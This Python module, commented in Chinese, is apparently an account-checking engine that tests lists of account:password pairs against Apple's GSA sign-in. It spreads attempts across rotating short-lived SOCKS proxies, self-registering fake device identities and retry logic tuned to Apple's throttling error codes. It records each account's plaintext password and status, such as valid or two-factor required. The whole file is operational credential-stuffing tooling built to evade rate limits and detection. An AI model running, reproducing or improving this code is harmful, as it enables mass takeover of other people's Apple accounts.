"""进程内线程认证执行器：共享设备池与 IP 池，按需自注册。

对齐 ``并发3/gsafast`` 的池模型，同时保留 cluster-lab 的总控/结果契约
（``results.jsonl`` / ``progress.json`` / ``done.json`` 与逐行结果字段）。

每个认证子进程独立运行本模块：

  · 进程启动时先按线程数一次性预取 IP，再启动补充线程；
  · Worker 每批从进程共享设备池借设备，优先 ready，无设备时自行注册，
    完成该批账号后把设备归还共享池；
  · 启动时一次性把本进程槽位读进内存：device_id、型号 profile、ready 状态；
  · 设备缺失/损坏时，由拿到任务的线程自己完成注册（fetch_headers
    registered=False），不依赖后台 DeviceBuilder 预注册；
  · 注册完成后只保留设备身份（device_id + client_info + user_agent），
    每条账号重新刷新公共头（fetch_headers registered=True），绝不跨账号
    复用一次性 OTP；
  · 代理池是进程内 supplier + 本地 deque，不跨进程共享 multiprocessing.Queue。
"""
from __future__ import annotations

import collections
import hashlib
import json
import shutil
import threading
import time
from pathlib import Path

from .common import atomic_json
from .executor import (
    DEVICE_REGISTRATION_TIMEOUT_SECONDS,
    StageTelemetry,
    _apple_reason_for_record,
    _cache_result_classifier,
    _device_id_label,
    _input_problem,
    _load_fastcheck,
    _proxy_debug_enabled,
    _refine_repair_auth,
    _reset_incomplete_device_slots,
    _split_account,
    _write_proxy_debug,
    record_device_registration,
)


PROXY_TTL_SECONDS = 50.0
PROXY_POOL_TARGET = 1000
PROXY_LOW_WATER = 200
PROXY_REFILL_BATCH = 200
PROXY_LEASE_MARGIN = 8.0
PROXY_QUARANTINE_SECONDS = 120.0
ACCOUNTS_PER_IP = 9
OTP_REUSE = 15
DEVICE_USE_LIMIT = 0


class ProxySource:
    """并发3 风格的进程内 IP 池：线程本地复用、临期保护、坏出口隔离。"""

    def __init__(self, api, scheme='socks5h', *, threads=1,
                 ttl=PROXY_TTL_SECONDS, target=PROXY_POOL_TARGET,
                 low_water=PROXY_LOW_WATER, refill_batch=PROXY_REFILL_BATCH,
                 lease_margin=PROXY_LEASE_MARGIN,
                 quarantine=PROXY_QUARANTINE_SECONDS, log=None):
        self.api = api
        self.scheme = scheme or 'socks5h'
        self.threads = max(1, int(threads))
        self.ttl = max(5.0, float(ttl))
        self.target = max(1, int(target))
        self.low_water = max(0, min(self.target - 1, int(low_water)))
        self.refill_batch = max(1, min(int(refill_batch), self.target))
        self.lease_margin = max(1.0, min(self.ttl - 1.0, float(lease_margin)))
        self.quarantine = max(self.ttl, float(quarantine))
        self.log = log or (lambda **kwargs: None)
        self._lock = threading.Lock()
        self._cv = threading.Condition(self._lock)
        self._local = {tid: collections.deque() for tid in range(self.threads)}
        self._free = collections.deque()
        self._busy = set()
        self._seen = {}
        self._bad_until = {}
        self._stop = threading.Event()
        self._supplier = None
        self.stats = {'fetched': 0, 'api_calls': 0, 'api_error': 0,
                      'acquired': 0, 'released': 0, 'discarded': 0,
                      'duplicate': 0, 'expired': 0, 'near_expiry': 0,
                      'local_hit': 0, 'shared_hit': 0,
                      'quarantined': 0, 'quarantine_reject': 0}

    def _fetch(self, num):
        num = max(1, int(num))
        started = time.monotonic()
        try:
            from fastcheck.proxy_pool import fetch_proxies
            values = list(fetch_proxies(
                self.api, num,
                scheme=None if self.scheme == 'http' else self.scheme))
        except Exception as exc:                                    # noqa: BLE001
            self.stats['api_calls'] += 1
            self.stats['api_error'] += 1
            self.log(error=type(exc).__name__)
            return []
        self.stats['api_calls'] += 1
        self.stats['fetched'] += len(values)
        self.log(requested=num, got=len(values),
                 elapsed_ms=round((time.monotonic() - started) * 1000, 1))
        return values

    def _accept(self, values):
        now = time.monotonic()
        expires = now + self.ttl
        fresh = []
        with self._cv:
            for proxy in values:
                if not proxy:
                    continue
                bad_until = self._bad_until.get(proxy, 0.0)
                if bad_until > now:
                    self.stats['quarantine_reject'] += 1
                    continue
                if bad_until:
                    self._bad_until.pop(proxy, None)
                if proxy in self._seen and self._seen[proxy] > now:
                    self.stats['duplicate'] += 1
                    continue
                self._seen[proxy] = expires
                fresh.append((proxy, expires))
        return fresh

    def warm(self, count):
        """进程开始任务时先给 IP 池备料，避免线程一上来全部空转等 API。"""
        count = min(self.target, max(1, int(count)))
        fresh = []
        rounds = 0
        while len(fresh) < count and rounds < 6 and not self._stop.is_set():
            values = self._fetch(min(200, count - len(fresh)))
            rounds += 1
            if not values:
                break
            fresh.extend(self._accept(values))
        with self._cv:
            for index, item in enumerate(fresh):
                if index < self.threads and not self._local[index]:
                    self._local[index].append(item)
                else:
                    self._free.append(item)
            self._cv.notify_all()
        return len(fresh)

    def start(self):
        if self._supplier is None:
            self._supplier = threading.Thread(target=self._supply_loop,
                                              name='proxy-supplier', daemon=True)
            self._supplier.start()
        return self

    def stop(self):
        self._stop.set()
        with self._cv:
            self._cv.notify_all()
        if self._supplier is not None:
            self._supplier.join(2)

    def _live(self):
        now = time.monotonic()
        return (sum(1 for bucket in self._local.values()
                    for _, exp in bucket if exp - now > self.lease_margin)
                + sum(1 for _, exp in self._free
                      if exp - now > self.lease_margin))

    def _prune(self):
        now = time.monotonic()
        for bucket in list(self._local.values()) + [self._free]:
            kept = collections.deque()
            while bucket:
                item = bucket.popleft()
                if item[1] - now > self.lease_margin:
                    kept.append(item)
                else:
                    self.stats['near_expiry'] += 1
                    self.stats['expired'] += 1
            bucket.extend(kept)

    def _supply_loop(self):
        while not self._stop.is_set():
            try:
                with self._cv:
                    self._prune()
                    available = self._live()
                if available < self.low_water:
                    request = min(self.refill_batch, self.target - available)
                    if request > 0:
                        fresh = self._accept(self._fetch(request))
                        with self._cv:
                            for item in fresh:
                                self._free.append(item)
                            self._cv.notify_all()
            except Exception as exc:                                # noqa: BLE001
                self.log(error=type(exc).__name__)
            self._stop.wait(1.0)

    def acquire(self, tid, wait=30.0):
        deadline = time.monotonic() + max(0.0, float(wait))
        tid = int(tid) % self.threads
        with self._cv:
            while True:
                now = time.monotonic()
                for bucket, hit in ((self._local[tid], 'local_hit'),
                                    (self._free, 'shared_hit')):
                    while bucket:
                        proxy, exp = bucket.popleft()
                        if exp - now <= self.lease_margin:
                            self.stats['near_expiry'] += 1
                            self.stats['expired'] += 1
                            continue
                        self._busy.add(proxy)
                        self.stats['acquired'] += 1
                        self.stats[hit] += 1
                        return proxy, exp
                remaining = deadline - time.monotonic()
                if remaining <= 0:
                    return None, 0.0
                self._cv.wait(min(0.2, remaining))

    def release(self, tid, proxy, expires_at, *, healthy=True):
        if not proxy:
            return 'dropped'
        tid = int(tid) % self.threads
        with self._cv:
            self._busy.discard(proxy)
            self.stats['released'] += 1
            now = time.monotonic()
            if not healthy or float(expires_at) - now <= self.lease_margin:
                self.stats['discarded'] += 1
                if not healthy:
                    until = now + self.quarantine
                    self._bad_until[proxy] = until
                    self._seen[proxy] = until
                    self.stats['quarantined'] += 1
                else:
                    self._seen.pop(proxy, None)
                return 'discarded'
            self._local[tid].append((proxy, float(expires_at)))
            self._cv.notify()
            return 'pooled'

    def snapshot(self):
        with self._cv:
            now = time.monotonic()
            return {'available': self._live(), 'busy': len(self._busy),
                    'local_live': sum(1 for bucket in self._local.values()
                                      for _, exp in bucket
                                      if exp - now > self.lease_margin),
                    'shared': sum(1 for _, exp in self._free
                                  if exp - now > self.lease_margin),
                    'target': self.target, 'low_water': self.low_water,
                    'ttl': self.ttl, 'lease_margin': self.lease_margin,
                    'quarantine': self.quarantine, **self.stats}


class DeviceSlot:
    """内存里的一台设备：身份持久化在磁盘，这里只缓存可复用的字段。"""

    __slots__ = ('slot', 'state', 'device_id', 'label', 'profile', 'uses',
                 'registration_proxy', 'model', 'identity', 'identity_uses')

    def __init__(self, slot, state, device_id, label, profile):
        self.slot = int(slot)
        self.state = state
        self.device_id = device_id
        self.label = label
        self.profile = profile or {'model': '', 'client_info': '', 'user_agent': ''}
        self.uses = 0
        self.registration_proxy = ''
        self.model = self.profile.get('model', '')
        self.identity = None
        self.identity_uses = 0


class ThreadDevicePool:
    """线程安全的进程内设备池：Worker 每批独占，批次完成即归还。

    设备分两条队列：``_ready``（已注册可直接用）与 ``_missing``（待注册）。
    工作线程 ``acquire()`` 时**先拿 ready 设备**；池里没有 ready 设备了才拿
    missing 槽位，由该线程**自己并发注册**（fetch_headers registered=False），
    注册成功后再去拿公共头。这样注册动作天然分布在多个线程上并发进行，不会
    出现旧后台 builder 那种一台一台串行注册的瓶颈。
    """

    def __init__(self, pool, slots, device_root, use_limit=DEVICE_USE_LIMIT):
        self.pool = pool
        self.device_root = device_root
        self.use_limit = max(0, int(use_limit))
        self._lock = threading.Lock()
        self._cv = threading.Condition(self._lock)
        self._ready = collections.deque()
        self._missing = collections.deque()
        self._busy = set()
        self._slots = {}
        self._slot_ids = [int(value) for value in slots]
        self.stats = {'acquired': 0, 'released': 0, 'registered': 0,
                      'register_failed': 0, 'rotated': 0}

    def prime(self):
        """一次性把设备读进内存：只读状态与型号，不做任何网络请求。"""
        from fastcheck.workers import device_profile
        for slot in self._slot_ids:
            inspected = self.pool.inspect(slot)
            profile = device_profile(self.pool, slot)
            self._slots[slot] = DeviceSlot(
                slot, inspected.get('state'), inspected.get('device_id'),
                _device_id_label(inspected.get('device_id')), profile)
        with self._cv:
            for slot in self._slot_ids:
                device = self._slots[slot]
                (self._ready if device.state == 'ready' else self._missing).append(slot)
            self._cv.notify_all()
        return self

    def acquire(self, wait=30.0, slot=None):
        """从共享池取设备；默认 ready-first，slot 仅保留兼容用途。"""
        deadline = time.monotonic() + max(0.0, float(wait))
        with self._cv:
            while True:
                if slot is not None:
                    wanted = int(slot)
                    if wanted not in self._busy:
                        for bucket in (self._ready, self._missing):
                            try:
                                bucket.remove(wanted)
                            except ValueError:
                                continue
                            self._busy.add(wanted)
                            self.stats['acquired'] += 1
                            return self._slots[wanted]
                if self._ready:
                    selected = self._ready.popleft()
                    self._busy.add(selected)
                    self.stats['acquired'] += 1
                    return self._slots[selected]
                if self._missing:
                    selected = self._missing.popleft()
                    self._busy.add(selected)
                    self.stats['acquired'] += 1
                    return self._slots[selected]
                remaining = deadline - time.monotonic()
                if remaining <= 0:
                    return None
                self._cv.wait(min(0.2, remaining))

    def release(self, device, *, retire=False):
        """归还槽位；retire=True 表示该身份用满，清理磁盘身份换新。"""
        if device is None:
            return
        with self._cv:
            self._busy.discard(device.slot)
            self.stats['released'] += 1
            if retire:
                self.stats['rotated'] += 1
                self._retire_identity(device.slot)
                device.state = 'missing'
                device.device_id = ''
                device.label = ''
                device.uses = 0
                device.registration_proxy = ''
                device.model = ''
                device.identity = None
                device.identity_uses = 0
                # 退役后重新随机型号，下次 register 再生成并落盘。
                device.profile = {'model': '', 'client_info': '', 'user_agent': ''}
            if device.state == 'ready':
                self._ready.append(device.slot)
            else:
                self._missing.append(device.slot)
            self._cv.notify()

    def _retire_identity(self, slot):
        """移除身份字节，保留槽位锁文件；与旧执行器 _retire_identity 一致。"""
        directory = self.pool.slot_directory(int(slot))
        if not directory.is_dir():
            return
        for path in directory.iterdir():
            if path.name in ('.lease.lock', '.lease-state.json'):
                continue
            if path.is_dir():
                shutil.rmtree(path, ignore_errors=True)
            else:
                path.unlink(missing_ok=True)

    def clear_incomplete(self, device):
        """注册失败后把槽位恢复成干净可复用状态。"""
        if self.pool.inspect(device.slot).get('state') in ('pending', 'invalid'):
            self._retire_identity(device.slot)
            device.state = 'missing'
            device.device_id = ''
            device.label = ''
            device.uses = 0
            device.identity = None
            device.identity_uses = 0

    def register(self, device, proxy, timeout):
        """线程拿到任务后自行并发注册这台设备（registered=False）。"""
        profile = device.profile
        if not profile.get('client_info') or not profile.get('user_agent'):
            from fastcheck.workers import device_profile
            profile = device_profile(self.pool, device.slot)
            device.profile = profile
            device.model = profile.get('model', '')
        info = {'client_info': profile['client_info'],
                'user_agent': profile['user_agent']}
        self.pool.fetch_headers(device.slot, info, timeout, registered=False,
                                proxy=proxy, provider_direct=True)
        refreshed = self.pool.inspect(device.slot)
        device.state = refreshed.get('state')
        device.device_id = refreshed.get('device_id')
        device.label = _device_id_label(refreshed.get('device_id'))
        device.model = profile.get('model', '')
        device.registration_proxy = proxy or ''
        device.identity = None
        device.identity_uses = 0
        record_device_registration(self.device_root, device.slot, proxy,
                                   profile.get('model', ''))
        self.stats['registered'] += 1

    def headers(self, device, proxy, timeout, reuse=OTP_REUSE, force=False):
        """保留设备身份；与并发3一致，默认一个公共头复用 15 个账号。"""
        reuse = max(1, int(reuse or 1))
        if not force and device.identity is not None and device.identity_uses < reuse:
            device.identity_uses += 1
            return device.identity
        profile = device.profile
        info = {'client_info': profile['client_info'],
                'user_agent': profile['user_agent']}
        identity = self.pool.fetch_headers(
            device.slot, info, timeout, registered=True,
            proxy=proxy, provider_direct=True)
        device.identity = identity
        device.identity_uses = 1
        return identity

    @staticmethod
    def reset_headers(device):
        device.identity = None
        device.identity_uses = 0

    def snapshot(self):
        with self._cv:
            ready = sum(1 for value in self._slots.values() if value.state == 'ready')
            return {'capacity': len(self._slots), 'ready': ready,
                    'free': len(self._ready) + len(self._missing),
                    'busy': len(self._busy),
                    'ready_free': len(self._ready), 'missing_free': len(self._missing),
                    'use_limit': self.use_limit, **self.stats}


def _result_bucket(result_bucket, result):
    """把 fastcheck 分类映射到总控认可的公开桶。"""
    try:
        http = int(result.get('http'))
    except (TypeError, ValueError):
        http = None
    if http in (0, 503):
        return 'timeout'
    bucket = result_bucket(result)
    return 'undetermined' if bucket in ('undetermined', 'unknown') else bucket


def _retryable_transport(result):
    try:
        http = int(result.get('http'))
    except (TypeError, ValueError):
        http = None
    try:
        apple_ec = int(result.get('apple_ec'))
    except (TypeError, ValueError):
        apple_ec = None
    apple_text = ' '.join(str(result.get(key) or '').strip()
                          for key in ('apple_message', 'reason', 'detail')).casefold()
    phrases = (
        'unable to sign you in to your apple account. try again later',
        'this request could not be completed because of a server error',
        'this action cannot be completed',
        'this action could not be completed. try again',
        'the request cannot be processed at this time. please try again later',
        'we cannot process your request, please try again later',
        'your account information was entered incorrectly',
    )
    return (http in (0, 503)
            or apple_ec in (-22421, -22410, -332000, -33200, -3000303)
            or any(phrase in apple_text for phrase in phrases))


GOOGLE_PROBE_URL = 'https://www.google.com/generate_204'


def _is_proxy_quality_failure(result):
    """判断超时/失败是否属于「代理出口质量」而非 Apple 应用层返回。

    http=0 表示连 HTTP 响应都没拿到，基本就是出口连不上/超时/SSL 被断；
    Apple 明确返回 503 / -20970 属于应用层，不算出口质量问题。
    """
    if not isinstance(result, dict):
        return False
    try:
        http = int(result.get('http'))
    except (TypeError, ValueError):
        http = None
    # HTTP 0 means no application response was received. Do not require an
    # English exception keyword: providers and libraries produce many localized
    # or empty details. Every HTTP 0 must immediately probe Google on the same IP.
    return http == 0


def _probe_google(proxy, timeout=5.0):
    """用同一条出口请求 Google，校验出口本身是否可用。

    返回 {'ok', 'http'|'error', 'ms'}。用于把「代理连不上 Apple」和「代理
    本身已死」区分开：Google 也连不上 → 出口坏了；Google 能连上 → 出口可用，
    是 Apple 对该出口/该账号限流。
    """
    if not proxy:
        return {'ok': False, 'error': 'no_proxy'}
    import requests
    started = time.monotonic()
    try:
        resp = requests.get(
            GOOGLE_PROBE_URL,
            proxies={'http': proxy, 'https': proxy},
            timeout=(max(1.0, float(timeout)), max(1.0, float(timeout))),
            verify=False, allow_redirects=False,
            headers={'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6)'},
        )
        return {'ok': resp.status_code in (200, 204),
                'http': resp.status_code,
                'ms': round((time.monotonic() - started) * 1000, 1)}
    except Exception as exc:                                        # noqa: BLE001
        return {'ok': False, 'error': type(exc).__name__,
                'ms': round((time.monotonic() - started) * 1000, 1)}


class Context:
    def __init__(self, *, cfg, gsa_check, result_bucket, devices, proxies,
                 tasks, stop, sink, sink_lock, counters, telemetry, debug):
        self.cfg = cfg
        self.gsa_check = gsa_check
        self.result_bucket = result_bucket
        self.devices = devices
        self.proxies = proxies
        self.tasks = tasks
        self.stop = stop
        self.sink = sink
        self.sink_lock = sink_lock
        self.counters = counters
        self.telemetry = telemetry
        self.debug = debug
        self._lock = threading.Lock()

    def take_task(self):
        with self._lock:
            if not self.tasks:
                return None
            return self.tasks.popleft()

    def tasks_empty(self):
        with self._lock:
            return not self.tasks

    def requeue(self, task):
        with self._lock:
            self.tasks.appendleft(task)


class Worker(threading.Thread):
    """每批从共享池借设备和出口；批次结束后归还设备。"""

    def __init__(self, tid, ctx):
        super().__init__(name=f'thread-auth-{tid}', daemon=True)
        self.tid = int(tid)
        self.ctx = ctx

    def run(self):
        ctx = self.ctx
        cfg = ctx.cfg
        while not ctx.stop.is_set():
            if ctx.tasks_empty():
                break
            device = ctx.devices.acquire(wait=30.0)
            if device is None:
                if ctx.tasks_empty():
                    break
                ctx.stop.wait(0.5)
                continue
            proxy, expires_at = None, 0.0
            served = 0
            try:
                if ctx.proxies is not None:
                    proxy, expires_at = ctx.proxies.acquire(self.tid, wait=60.0)
                    if proxy is None:
                        if ctx.tasks_empty():
                            break
                        ctx.stop.wait(0.5)
                        continue
                for _ in range(cfg['accounts_per_ip']):
                    task = ctx.take_task()
                    if task is None:
                        break
                    row, line = task
                    result, proxy, expires_at = self._process(
                        device, row, line, proxy, expires_at)
                    ctx.sink(row, line, device, result)
                    served += 1
                    device.uses += 1
                    if ctx.devices.use_limit and device.uses >= ctx.devices.use_limit:
                        break
            finally:
                if ctx.proxies is not None and proxy:
                    ctx.proxies.release(self.tid, proxy, expires_at, healthy=True)
                retire = bool(ctx.devices.use_limit and
                              device.uses >= ctx.devices.use_limit)
                ctx.devices.release(device, retire=retire)
            if served == 0 and ctx.tasks_empty():
                break

    def _process(self, device, row, line, proxy, expires_at):
        """保证设备就绪，复用公共头，并在链路失败时换出口重试。"""
        ctx = self.ctx
        cfg = ctx.cfg
        account, password = _split_account(line)
        slot_id = device.slot
        if not line.strip():
            return ({'status': 'undetermined', 'kind': 'blank_record',
                     'slot': slot_id, 'device_key': device.label, 'elapsed': 0},
                    proxy, expires_at)
        problem = _input_problem(account, password)
        if problem:
            return ({'status': 'undetermined', 'kind': 'format_error',
                     'stage': 'input', 'http': None, 'detail': problem,
                     'slot': slot_id, 'device_key': device.label, 'elapsed': 0},
                    proxy, expires_at)

        attempt_limit = cfg['retries'] + 1
        auth_attempt = 0
        registration_attempts = 0
        started = time.time()
        result = None
        while auth_attempt < attempt_limit and not ctx.stop.is_set():
            if ctx.proxies is not None and proxy is None:
                proxy, expires_at = ctx.proxies.acquire(self.tid, wait=30.0)
                if proxy is None:
                    result = {'status': 'error', 'kind': 'proxy', 'http': 0,
                              'stage': 'init', 'detail': '代理池暂时无可用出口'}
                    break
            try:
                if device.state != 'ready':
                    ctx.devices.register(
                        device, proxy, DEVICE_REGISTRATION_TIMEOUT_SECONDS)
                identity = ctx.devices.headers(
                    device, proxy, cfg['timeout'], reuse=cfg['otp_reuse'])
                result = ctx.gsa_check(
                    account, password, proxy, timeout=cfg['timeout'],
                    retries=0, cancel=ctx.stop.is_set, identity=identity)
                result['_device_use'] = device.uses + 1
                if cfg.get('web_secondary_auth'):
                    result = self._refine_web(result, account, password, proxy)
            except Exception as exc:                                # noqa: BLE001
                google_probe = None
                if ctx.proxies is not None and proxy:
                    google_probe = _probe_google(
                        proxy, timeout=min(5.0, max(2.0, cfg['timeout'] * 0.5)))
                    ctx.proxies.release(
                        self.tid, proxy, expires_at, healthy=False)
                    proxy, expires_at = None, 0.0
                if device.state != 'ready':
                    ctx.devices.clear_incomplete(device)
                    ctx.devices.stats['register_failed'] += 1
                    registration_attempts += 1
                    if registration_attempts < 3:
                        continue
                    result = {'status': 'error', 'kind': 'register_failed',
                              'http': 0, 'stage': 'device_register',
                              'detail': '设备注册连续失败 3 次',
                              'slot': slot_id, 'device_key': device.label,
                              'elapsed': round(time.time() - started, 2)}
                else:
                    result = {'status': 'error', 'kind': type(exc).__name__,
                              'http': 0, 'stage': 'init', 'detail': str(exc)[:180],
                              'slot': slot_id, 'device_key': device.label,
                              'elapsed': round(time.time() - started, 2)}
                if google_probe is not None:
                    result['google_probe'] = google_probe
                result['_proxy_retries'] = auth_attempt
                auth_attempt += 1
                if auth_attempt < attempt_limit and result.get('kind') != 'register_failed':
                    continue
                break

            retryable = _retryable_transport(result)
            if retryable and ctx.proxies is not None and proxy:
                if _is_proxy_quality_failure(result):
                    result['google_probe'] = _probe_google(
                        proxy, timeout=min(5.0, max(2.0, cfg['timeout'] * 0.5)))
                ctx.proxies.release(
                    self.tid, proxy, expires_at, healthy=False)
                proxy, expires_at = None, 0.0
            try:
                apple_ec = int(result.get('apple_ec'))
            except (TypeError, ValueError):
                apple_ec = None
            if apple_ec == -22421:
                ctx.devices.reset_headers(device)
            result['_proxy_retries'] = auth_attempt
            if retryable and auth_attempt + 1 < attempt_limit:
                auth_attempt += 1
                continue
            break

        if result is None:
            result = {'status': 'error', 'kind': 'proxy', 'http': 0,
                      'stage': 'init', 'detail': '代理池未返回结果'}
        result.setdefault('elapsed', round(time.time() - started, 2))
        result.setdefault('slot', slot_id)
        result.setdefault('device_key', device.label)
        return result, proxy, expires_at

    def _refine_web(self, result, account, password, proxy):
        cfg = self.ctx.cfg
        if (not isinstance(result, dict)
                or result.get('status') != 'need_2fa'
                or str(result.get('auth_type') or '').strip().casefold() != 'repair'):
            return result
        return _refine_repair_auth(
            result, account, password, proxy, cfg['timeout'],
            self.ctx.stop.is_set, retries=cfg['retries'])

def run_thread_auth(directory, descriptor, stop):
    """线程模式认证入口：任何异常都落成 done.json，节点不只看进程退出。"""
    try:
        _run_thread_auth(directory, descriptor, stop)
    except Exception as exc:                                       # noqa: BLE001
        atomic_json(Path(directory) / 'done.json',
                    {'ok': False, 'processed': 0,
                     'error': f'{type(exc).__name__}: {exc}'[:300]})


def _run_thread_auth(directory, descriptor, stop):
    directory = Path(directory)
    started = time.time()
    output_path = directory / 'results.jsonl'
    DevicePool, gsa_check, result_bucket = _load_fastcheck()
    result_bucket = _cache_result_classifier(result_bucket)

    rows = int(descriptor.get('rows') or 0)
    first_row = int(descriptor.get('first_row') or 1)
    timeout = float(descriptor.get('timeout') or 20)
    retries = max(0, int(descriptor.get('retries') or 0))
    origin = descriptor.get('origin') or 'https://new.ani.sidestore.io'
    device_root = descriptor.get('device_root')
    capacity = int(descriptor.get('device_pool_capacity') or
                   descriptor.get('device_capacity') or 8)
    configured_slots = descriptor.get('device_slots')
    if isinstance(configured_slots, list) and configured_slots:
        slot_ids = [max(1, min(capacity, int(value))) for value in configured_slots]
    else:
        slot_ids = list(range(1, capacity + 1))
    use_limit = max(0, int(descriptor.get('device_use_limit', DEVICE_USE_LIMIT)))
    debug_enabled = _proxy_debug_enabled(descriptor)
    debug_path = (descriptor.get('_proxy_debug_path') or
                  str(directory / 'proxy-debug.jsonl')) if debug_enabled else None

    # 线程共享本进程设备池；线程数受本进程槽位与账号数双重约束。
    thread_count = max(1, min(len(slot_ids), rows))
    accounts_per_ip = max(1, min(ACCOUNTS_PER_IP,
                                 int(descriptor.get('accounts_per_ip') or ACCOUNTS_PER_IP)))
    otp_reuse = max(1, int(descriptor.get('otp_reuse') or OTP_REUSE))

    pool = DevicePool(device_root, origin, max_devices=capacity)
    _reset_incomplete_device_slots(pool, slot_ids)
    devices = ThreadDevicePool(pool, slot_ids, device_root, use_limit=use_limit)
    # 一次性把设备读进内存。
    devices.prime()

    if debug_enabled:
        _write_proxy_debug(
            debug_path, 'worker_start', rows=rows, first_row=first_row,
            threads=thread_count, slots=slot_ids, retries=retries,
            timeout=timeout, accounts_per_ip=accounts_per_ip,
            otp_reuse=otp_reuse,
            credentials_recorded=False)

    proxies = None
    if descriptor.get('proxy_api'):
        proxies = ProxySource(
            descriptor['proxy_api'],
            scheme=descriptor.get('proxy_scheme') or 'socks5h',
            threads=thread_count,
            ttl=float(descriptor.get('proxy_ttl') or PROXY_TTL_SECONDS),
            target=thread_count,
            log=(lambda **fields: _write_proxy_debug(debug_path, 'proxy', **fields)
                 if debug_enabled else None))
        # 进程开始任务时先一次性拉取与线程数相同的 IP（10 线程即 10 个）。
        proxies.warm(thread_count)
        proxies.start()

    # 读全部账号进内存，再由工作线程取任务。
    tasks = collections.deque()
    with (directory / 'input.part').open('r', encoding='utf-8', errors='replace') as source:
        index = 0
        for line in source:
            line = line.rstrip('\r\n')
            tasks.append((first_row + index, line))
            index += 1
    if len(tasks) != rows:
        raise ValueError('输入条数和工作包描述不一致')

    counters = collections.Counter()
    sink_lock = threading.Lock()
    telemetry = StageTelemetry(debug_enabled)
    # 有序结果缓冲：工作线程并发写，协调线程按行号顺序落盘。
    pending_rows = {}
    next_write_row = first_row
    processed = 0
    output_digest = hashlib.sha256()

    output = output_path.open('wb')
    output_path.chmod(0o600)
    try:
        def sink(row, line, device, result):
            nonlocal next_write_row, processed
            status = _result_bucket(result_bucket, result)
            with sink_lock:
                counters[status] += 1
            record = build_record(row, line, result, status, device,
                                  device_label=device.label, debug=debug_enabled)
            encoded = (json.dumps(record, separators=(',', ':')) + '\n').encode()
            with sink_lock:
                pending_rows[row] = encoded
                while next_write_row in pending_rows:
                    chunk = pending_rows.pop(next_write_row)
                    output.write(chunk)
                    output_digest.update(chunk)
                    processed += 1
                    next_write_row += 1

        cfg = {
            'retries': retries,
            'timeout': timeout,
            'accounts_per_ip': accounts_per_ip,
            'otp_reuse': otp_reuse,
            'web_secondary_auth': bool(descriptor.get('_web_secondary_auth')),
        }

        ctx = Context(cfg=cfg, gsa_check=gsa_check, result_bucket=result_bucket,
                      devices=devices, proxies=proxies, tasks=tasks, stop=stop,
                      sink=sink, sink_lock=sink_lock, counters=counters,
                      telemetry=telemetry, debug=debug_enabled)

        workers = [Worker(index, ctx) for index in range(thread_count)]
        for worker in workers:
            worker.start()

        last_progress = time.monotonic()
        while next_write_row < first_row + rows and not stop.is_set():
            if time.monotonic() - last_progress >= 0.25:
                output.flush()
                atomic_json(directory / 'progress.json', {
                    'processed': processed, 'started': started,
                    'counts': dict(counters),
                    'workers': thread_count, 'worker_limit': thread_count,
                    'threads_per_process': thread_count,
                    'active_threads_per_process': thread_count,
                    'active_threads_total': thread_count,
                    'threads': thread_count,
                    'stage_metrics': telemetry.snapshot(0),
                    'proxy_pool': proxies.snapshot() if proxies else {},
                    'devices': devices.snapshot(),
                })
                last_progress = time.monotonic()
            # 所有线程都退出了且没有剩余任务时不再空转。
            if not any(worker.is_alive() for worker in workers) and ctx.tasks_empty():
                break
            stop.wait(0.05)

        for worker in workers:
            worker.join(2)

        if stop.is_set():
            raise InterruptedError('租约失效或节点关闭')
        if processed != rows:
            # 兜底：补写占位结果，保证总控收包能校验条数。
            for row in range(next_write_row, first_row + rows):
                record = build_record(row, '', {'status': 'undetermined',
                                                'kind': 'unfinished'}, 'undetermined',
                                      device=None, device_label='', debug=debug_enabled)
                encoded = (json.dumps(record, separators=(',', ':')) + '\n').encode()
                output.write(encoded)
                output_digest.update(encoded)
                processed += 1
        output.flush()
    finally:
        output.close()
        if proxies:
            proxies.stop()

    atomic_json(directory / 'progress.json', {
        'processed': processed, 'started': started, 'counts': dict(counters),
        'workers': 0, 'worker_limit': thread_count,
        'threads_per_process': thread_count,
        'active_threads_per_process': thread_count,
        'active_threads_total': thread_count,
        'threads': thread_count,
        'stage_metrics': telemetry.snapshot(0),
        'proxy_pool': proxies.snapshot() if proxies else {},
        'devices': devices.snapshot(),
    })
    atomic_json(directory / 'done.json', {
        'ok': True, 'processed': processed, 'counts': dict(counters),
        'checksum': output_digest.hexdigest(),
        'elapsed': time.time() - started,
        'workers': thread_count,
        'stage_metrics': telemetry.snapshot(0),
        'proxy_pool': proxies.snapshot() if proxies else {},
        'devices': devices.snapshot(),
    })


def build_record(row, line, result, status, device=None, *, device_label='', debug=False):
    """按总控契约组装逐行结果，字段与旧执行器完全一致。"""
    result = result if isinstance(result, dict) else {}
    account, password = _split_account(line)
    raw_line = line.encode('utf-8')
    slot = result.get('slot')
    if slot is None and device is not None:
        slot = device.slot
    device_usage = int(result['_device_use']) if result.get('_device_use') is not None else 0
    business_code = result.get('apple_ec')
    if business_code is None and result.get('kind') == 'format_error':
        business_code = 'format_error'
    if business_code is None:
        business_code = (result.get('detail') or result.get('kind') or '')[:180]
    reason = _apple_reason_for_record(result, status, debug)
    attempts = max(int(result.get('_proxy_retries') or 0),
                   max(0, int(result.get('web_attempts') or 0) - 1))
    record = {'row': row, 'account': account, 'password': password,
              'status': status, 'sha256': hashlib.sha256(raw_line).hexdigest(),
              'bytes': len(raw_line),
              'stage': result.get('stage') or '',
              'http': result.get('http'),
              'code': str(business_code)[:180], 'reason': reason,
              'protocol': 'GSA', 'device': slot,
              'device_key': result.get('device_key') or '',
              'device_label': device_label,
              'device_usage': device_usage,
              'elapsed': result.get('elapsed'),
              'attempts': attempts}
    # 出口质量失败时的谷歌校验结果：区分「出口坏了」与「Apple 限流」。
    if isinstance(result.get('google_probe'), dict):
        record['google_probe'] = result['google_probe']
    for key in ('two_factor_method', 'web_auth_type', 'web_http', 'web_status',
                'web_stage', 'web_kind', 'web_detail', 'web_attempts',
                'web_server', 'web_via', 'web_retry_after', 'web_content_type',
                'web_response_bytes', 'web_response_sha256', 'web_response_keys',
                'web_service_error_codes', 'web_has_session_headers',
                'web_has_set_cookie', 'web_proxy_rotations', 'web_rotation_exhausted'):
        if result.get(key) not in (None, ''):
            record[key] = result[key]
    return record
